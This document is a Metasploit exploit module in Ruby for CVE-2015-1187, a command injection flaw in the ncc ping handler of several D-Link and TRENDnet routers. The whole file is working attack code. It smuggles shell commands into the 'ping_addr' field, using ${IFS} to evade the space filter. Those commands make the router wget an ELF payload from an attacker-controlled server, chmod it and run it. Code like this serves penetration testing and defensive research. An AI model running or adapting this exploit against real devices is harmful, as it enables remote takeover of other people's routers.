# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # Only tested on Emulated environment
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;D-Link/TRENDnet NCC Service Command Injection&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command injection vulnerability on several routers. The
        vulnerability exists in the ncc service, while handling ping commands. This module has
        been tested on a DIR-626L emulated environment. Several D-Link and TRENDnet devices
        are reported as affected, including: D-Link DIR-626L (Rev A) v1.04b04, D-Link DIR-636L
        (Rev A) v1.04, D-Link DIR-808L (Rev A) v1.03b05, D-Link DIR-810L (Rev A) v1.01b04, D-Link
        DIR-810L (Rev B) v2.02b01, D-Link DIR-820L (Rev A) v1.02B10, D-Link DIR-820L (Rev A)
        v1.05B03, D-Link DIR-820L (Rev B) v2.01b02, D-Link DIR-826L (Rev A) v1.00b23, D-Link
        DIR-830L (Rev A) v1.00b07, D-Link DIR-836L (Rev A) v1.01b03 and TRENDnet TEW-731BR (Rev 2)
        v2.01b01
      },
      &#039;Author&#039;         =>
        [
          &#039;Peter Adkins <peter.adkins[at]kernelpicnic.net>&#039;, # Vulnerability discovery and initial PoC
          &#039;Tiago Caetano Henriques&#039;, # Vulnerability discovery and initial PoC
          &#039;Michael Messner <devnull[at]s3cur1ty.de>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-1187&#039;],
          [&#039;BID&#039;, &#039;72816&#039;],
          [&#039;URL&#039;, &#039;https://github.com/darkarnium/secpub/tree/master/Multivendor/ncc2&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Mar/15&#039;],
          [&#039;URL&#039;, &#039;http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10052&#039;]
        ],
      &#039;Targets&#039;        =>
        # Only tested on D-Link DIR-626L where wget is available
        [
          [ &#039;Linux mipsel Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
          [ &#039;Linux mipsbe Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_MIPSBE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 26 2015&#039;,
      &#039;DefaultTarget&#039;   => 0))
 
    register_options(
      [
        OptString.new(&#039;WRITABLEDIR&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ]),
        OptString.new(&#039;EXTURL&#039;, [ false, &#039;An alternative host to request the EXE payload from&#039; ]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the vulnerable application area&#039;, &#039;/ping.ccp&#039;]),
        OptInt.new(&#039;HTTPDELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 10])
      ], self.class)
  end
 
  def check
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path)
      })
 
      # unknown if other devices also using mini_httpd
      if res && [500].include?(res.code) && res.headers[&#039;Server&#039;] && res.headers[&#039;Server&#039;] =~ /mini_httpd/
        return Exploit::CheckCode::Detected
      end
    rescue ::Rex::ConnectionError
      return Exploit::CheckCode::Unknown
    end
 
    Exploit::CheckCode::Unknown
  end
 
  def exec_command(cmd, timeout = 20)
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;POST&#039;,
        &#039;uri&#039;    => normalize_uri(target_uri.path),
        &#039;encode_params&#039; => false,
        &#039;vars_post&#039; => {
          &#039;ccp_act&#039; => &#039;ping_v6&#039;,
          &#039;ping_addr&#039; => &#039;$(&#039; + cmd + &#039;)&#039;
        }
      }, timeout)
      return res
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end
 
  def primer
    @payload_url = get_uri
    wget_payload
  end
 
  def exploit
    print_status("Accessing the vulnerable URL...")
 
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NoTarget, "#{peer} - Failed to access the vulnerable URL")
    end
 
    print_status("Exploiting...")
 
    @pl = generate_payload_exe
    @payload_url  = &#039;&#039;
    @dropped_elf = rand_text_alpha(rand(5) + 3)
 
    if datastore[&#039;EXTURL&#039;].blank?
      begin
        Timeout.timeout(datastore[&#039;HTTPDELAY&#039;]) { super }
      rescue Timeout::Error
      end
      chmod_payload
      exec_payload
    else
      @payload_url = datastore[&#039;EXTURL&#039;]
      wget_payload
      chmod_payload
      exec_payload
    end
  end
 
  def wget_payload
    upload_path = File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)
 
    cmd = "wget${IFS}#{@payload_url}${IFS}-O${IFS}#{upload_path}"
 
    print_status("Downloading the payload to the target machine...")
    res = exec_command(cmd)
 
    if res && [200].include?(res.code) && res.headers[&#039;Server&#039;] && res.headers[&#039;Server&#039;] =~ /mini_httpd/
      register_files_for_cleanup(upload_path)
    else
      fail_with(Failure::Unknown, "#{peer} - Failed to download the payload to the target")
    end
  end
 
  def chmod_payload
    cmd = "chmod${IFS}777${IFS}#{File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)}"
 
    print_status("chmod the payload...")
    res = exec_command(cmd, 1)
 
    unless res
      fail_with(Failure::Unknown, "#{peer} - Unable to chmod payload")
    end
 
    Rex.sleep(1)
  end
 
  def exec_payload
    cmd = File.join(datastore[&#039;WRITABLEDIR&#039;], @dropped_elf)
 
    print_status("Executing the payload...")
    res = exec_command(cmd, 1)
 
    unless res
      fail_with(Failure::Unknown, "#{peer} - Unable to exec payload")
    end
 
    Rex.sleep(1)
  end
 
  # Handle incoming requests to the HTTP server
  def on_request_uri(cli, request)
    print_status("Request: #{request.uri}")
    if request.uri =~ /#{Regexp.escape(get_resource)}/
      print_status(&#039;Sending payload...&#039;)
      send_response(cli, @pl)
    end
  end
end

